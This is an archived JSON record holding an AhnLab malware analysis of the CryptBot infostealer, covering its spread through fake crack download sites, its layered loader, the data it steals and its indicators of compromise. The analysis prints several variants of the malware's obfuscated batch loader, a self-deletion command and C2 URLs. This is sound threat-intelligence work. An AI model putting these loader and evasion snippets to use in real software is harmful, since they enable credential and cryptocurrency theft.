{
    "id": "edccbafe-a913-4a66-bccb-5f7483c19fe3",
    "created_at": "2023-01-12T15:05:42.221623Z",
    "updated_at": "2025-03-27T02:05:45.831119Z",
    "deleted_at": null,
    "sha1_hash": "eb12b6376ccec25c3e7155f3b3efc7039bd93eef",
    "title": "2021-08-09 - CryptBot Infostealer Constantly Changing and Being Distributed",
    "authors": "",
    "file_creation_date": "2022-05-28T23:14:24Z",
    "file_modification_date": "2022-05-28T23:14:24Z",
    "file_size": 2059716,
    "plain_text": "# CryptBot Infostealer Constantly Changing and Being Distributed\n\n**asec.ahnlab.com/en/26052/**\n\nAugust 9, 2021\n\nCryptBot is an Infostealer that is being distributed through malicious websites disguised as\nsoftware download pages. Because there are multiple malicious websites created and many\nof them appear on the top page when keywords such as cracks and serials of popular\ncommercial software are entered in search engines, many users are subject to download the\nmalware and run it. In addition, the sample uses the SFX packing, making difficult to\ndistinguish between normal and malicious files, and changes occur multiple times a day.\n\nSince the websites disguise themselves as download pages, users are convinced by the\nseemingly normal file running malware multiple times even when V3 products block it, which\nrequires users’ extra caution. AhnLab has been continually making blog posts about aiming\nto raise people’s awareness of its danger.\n\n\n-----\n\nFigure 1. Sample of CryptBot distribution website\nAs shown in the figure below, the malware is compressed into many layers. The final\ncompressed file has a txt file that contains password.\n\n\n-----\n\nFigure 2. Compressed file downloaded from malicious website\nWhen the malware is run, it creates folder names such as 7z.SFX.xxx and IXPxxx.TMP in\nthe %temp% path and files necessary for the infection in the folder. Filenames and\nextensions vary for every change. The created files are as follows.\n\nFigure 3. Dropped files\n\nBAT script (Far.vsdx)\nAutoit script (Impedire.vsdx)\nEncrypted CryptBot binary (Vento.vsdx)\nAutoit executable (Copre.vsdx)\n\nThe malware runs the BAT script after creating files. See below for the structure of the script.\n\n\n-----\n\nFigure 4. BAT script\nOne thing to note about the script is that it changes periodically. As it can be easily changed,\nthe attacker alters the pattern by slightly modifying the grammar while maintaining its\nfeatures. The following table shows the date of BAT script changes in CryptBot samples that\nwere collected for about a month. As shown below, the change cycle has become shorter.\n\nConfronto.jar June 16th, 2021\n\nAprile.accdr July 6th, 2021\n\nVirtuoso.bmp July 16th, 2021\n\nOrti.html July 17th, 2021\n\nPensai.wmz July 21st, 2021\n\nLume.eml July 22nd, 2021\n\nRitroverai.aiff July 23rd, 2021\n\nPovera.ppsm July 24th, 2021\n\nIdeale.dotx July 25th, 2021\n\nAffonda.wms July 26th, 2021\n\nEsaltavano.tiff July 28th, 2021\n\nTable 1. Date of changes\nThe following table shows the main changes. As shown below, while the feature of the BAT\nscript itself did not change, the grammar or environment variable used has changed slightly.\n\nAprile.accdr\n\nif %userdomain%==DESKTOP-QO5QU33 exit 2\n\n<nul set /p = “MZ”> Ripreso.exe.com\n\nfindstr /V /R “^AGbW…xiSv$” Fianco.accdr >> Ripreso.exe.com”\n\ncopy Fra.accdr B\n\nstart Ripreso.exe.com B\n\nping 127.0.0.1 -n 30\n\nVirtuoso.bmp\n\n\n-----\n\n**Set PRehIgqfWNWhFAxNgjgzQhcGBgikLpocQQTp=DESKTOP-**\n\n**Set zVqJPft=QO5QU33**\n\n**Set bizASaCEemlwdhJhU=MZ**\n\nif %userdomain%==%PRehIgqfWNWhFAxNgjgzQhcGBgikLpocQQTp% exit 8\n\n<nul set /p = “%bizASaCEemlwdhJhU%“> Compatto.exe.com\n\nfindstr /V /R “^viIO…hWwHg$” Baciandola.bmp >> Compatto.exe.com”\n\ncopy Corano.bmp w\n\nstart Compatto.exe.com w\n\nping 127.0.0.1 -n 30\n\nLume.eml\n\n**echo XrHAkUeB**\n\n**echo XrHAkUeB**\n\nif %userdomain%==DESKTOP-QO5QU33 exit 2\n\n<nul set /p = “MZ”> Mese.exe.com\n\nfindstr /V /R “^VtHMWSo…DuPlDDuA$” Giorni.eml >> Mese.exe.com”\n\ncopy Scossa.eml h\n\nstart Mese.exe.com h\n\nping 127.0.0.1 -n 30\n\nEsaltavano.tiff\n\nSet PaWlwDiebzBsRrpYjIjVHC=DESKTOP\nSet hQfTrWvlasdWKZ=QO5QU33\n\nif %computername%==%PaWlwDiebzBsRrpYjIjVHC% exit\n\nSet OzhMvyIxp=MZ\n\n<nul set /p = “%OzhMvyIxp%” > Hai.exe.com\n\nfindstr /V /R “^fqCO…pHiJlm$” Affettuosa.tiff >> Hai.exe.com”\n\ncopy Saluta.tiff S\n\nstart Hai.exe.com S\n\nping localhost -n 30\n\nTable 2. Changed content\nWhen the BAT script is executed, it copies the Autoit executable with the filename [random\nname].exe.com. It then copies the Autoit script with a certain filename and gives the script as\nan argument to run the file.\n\nFigure 5. Executed Autoit\n\nprocess\n\n\n-----\n\nThe Autoit script decrypts the encrypted binary to copy it to the virtual memory area and run\nit.\n\nFigure 6. Decrypted CryptBot malware binary\nWhen the CryptBot binary loaded in the memory is executed, it scans for directories of\ncertain anti-malware products. When the directory exists, the binary generates a random\nnumber and performs Sleep for that amount. It is assumed that delay execution is done to\nbypass detection.\n\nFigure 7. Scan\n\ncode for directories of anti-malware products\nThe code then scans for the existence of a particular directory. If the directory already exists,\nthe script considers either a duplicate execution or an already infected system, and selfdeletes after termination. The name of the directory differs for each sample.\n\nFigure 8. Duplicate execution\n\nscan\nWhen performing self-deletion, the script runs the following cmd command through the\nShellExecuteW function.\n\n\n-----\n\n/c rd /s /q %Temp%\\[name of the created directory] & timeout 2 & del /f /q “[malware\nexecution path]”\n\nTable 3. Command for self-deletion\nWhen the malware begins its malicious behaviors, it creates a random directory in %TEMP%\nand collects various user information. The following shows the information collected by the\nsample.\n\nBrowser Information (Chrome, Firefox, and Opera)\n\nCookie\nSaved form data\nSaved account names and passwords\nCryptocurrency wallet information\nSystem info\n\nName of executed sample\nOS and Country information\nUser account and PC name\nHardware information\nList of installed programs\nScreenshots\n\nFigure 9. Collected data\n\nof accounts and passwords saved in browsers\n\n\n-----\n\nFigure 10. Collected data of system info\nWhen information collection is complete, everything in the created directory is compressed\ninto a ZIP file with a password and sent to C2. The .top domain which changes often is\nmainly used for the C2 URL. For a CryptBot malware sample, there are usually 3 C2s in\ntotal: 2 for sending information and 1 for downloading additional malware.\n\nFigure 11. C2 Transmission Code\n\nWhen the C2 transmission process is complete, the malware accesses a particular URL and\nruns additional malware after downloading it. ClipBanker types are usually downloaded.\n\nFigure 12. Code for downloading and running additional malware\nIf the system is infected by this malware, confidential information such as account names,\npasswords, and cryptocurrency wallets is leaked. It is highly likely that there will be\nsecondary damages exploiting the leaked information, users need to take caution.\n\nAhnLab’s anti-malware software, V3, detects and blocks the malware using the following\naliases:\n\n\n-----\n\nTrojan/Win.CryptLoader.XM122\nTrojan/BAT.CryptLoader.S1612\nTrojan/BAT.CryptLoader.S1610\nWin-Trojan/MalPeP.mexp\n\n[IOC Info]\n\nc2bc3bef415ae0ed2e89cb864fff2bfc\n58774ece556b0a1e01443ea1c3c68e5a\n\newais32[.]top/index.php\nmorxeg03[.]top/index.php\nwinxob04[.]top/download.php?file=lv.exe\n\nsmaxgr31[.]top/index.php\nmorers03[.]top/index.php\ngurswj04[.]top/download.php?file=lv.exe\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-09 - CryptBot Infostealer Constantly Changing and Being Distributed.pdf"
    ],
    "report_names": [
        "2021-08-09 - CryptBot Infostealer Constantly Changing and Being Distributed.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535942,
    "ts_updated_at": 1743041145,
    "ts_creation_date": 1653779664,
    "ts_modification_date": 1653779664,
    "files": {
        "pdf": "https://archive.orkl.eu/eb12b6376ccec25c3e7155f3b3efc7039bd93eef.pdf",
        "text": "https://archive.orkl.eu/eb12b6376ccec25c3e7155f3b3efc7039bd93eef.txt",
        "img": "https://archive.orkl.eu/eb12b6376ccec25c3e7155f3b3efc7039bd93eef.jpg"
    }
}